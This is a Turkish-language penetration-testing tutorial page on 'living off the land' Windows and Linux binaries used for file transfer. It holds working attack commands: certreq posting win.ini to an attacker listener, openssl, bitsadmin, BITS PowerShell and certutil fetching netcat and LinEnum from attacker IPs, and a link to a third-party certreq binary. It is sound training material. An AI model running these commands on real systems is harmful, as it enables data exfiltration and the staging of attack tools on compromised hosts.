---
glightbox: true
icon: material/circle-small
---

# Living off The Land

LOLBins (Living Off The Land Binaries) terimi, bir saldırganın, orijinal amacının ötesinde eylemler gerçekleştirmek için kullanabileceği ikili dosyaları ifade etmek için kullanılır. Aşağıda verilen siteler bahsedilen ikili dosyalar hakkında bilgi toplamaktadır:

1. [LOLBAS](https://lolbas-project.github.io)
2. [GTFOBins](https://gtfobins.github.io/)

## Using the LOLBAS and GTFOBins Project

### LOLBAS

LOLBAS (Living Off The Land Binaries, Scripts and Libraries) sitesinde indirme ve yükleme işlevlerini aramak için `/download` ve `/upload` filtrelerini kullanabiliriz.

Örnek olarak [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) aracını ele alalım. Netcat aracını kullanarak gelen trafiği, saldırı makinemizdeki bir port üzerinden dinlememiz ve ardından bir dosya yüklemek için `CertReq.exe` aracını çalıştırmamız gerekiyor:

```batch
certreq.exe -Post -config http://192.168.49.128 c:\windows\win.ini
```

Bu işlem, dosyayı Netcat oturumumuza gönderecektir:

```bash
sudo nc -lvnp 80
```

```text title="Output"
listening on [any] 80 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Eğer `CertReq.exe` aracını çalıştırırken hata alırsanız kullandığınız sürüm POST parametresini içermiyor olabilir. Güncel sürümü [buradan](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) indirip tekrar deneyebilirsiniz.

### GTFOBins

LOLBAS sitesinde indirme ve yükleme işlevlerini aramak için `+file download` ve `+file upload` filtrelerini kullanabiliriz.

Örnek olarak [OpenSSL](https://www.openssl.org/) aracını ele alalım. Öncelikle bir sertifika oluşturmamız gerekiyor:

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

Ardından sunucuyu başlatıyoruz:

```bash
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Artık ele geçirilmiş bilgisayardan dosyayı indirebiliriz:

```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Other Common Living off the Land Tools

### Bitsadmin Download function

BITS ([Background Intelligent Transfer Service](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)), HTTP sitelerinden ve SMB paylaşımlarından dosya indirmek için kullanılabilir. Bu servis, kullanıcının ön plandaki çalışması üzerindeki etkiyi en aza indirmek için bilgisayar ve ağ kullanımını akıllıca kontrol eder:

```batch
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell, BITS ile etkileşime olanak tanır, dosya indirme ve yükleme işlemleri gerçekleştirebilir, kimlik bilgilerini destekler ve belirtilen proxy sunucularını kullanabilir:

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Certutil

Certutil aracı dosyaları indirmek için kullanılabilir. Tüm Windows sürümlerinde mevcuttur ve Windows için popüler bir dosya aktarım tekniğidir. Ancak AMSI (Antimalware Scan Interface), bu araçla yapılan kötü niyetli kullanımları algılamaktadır:

```batch
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```
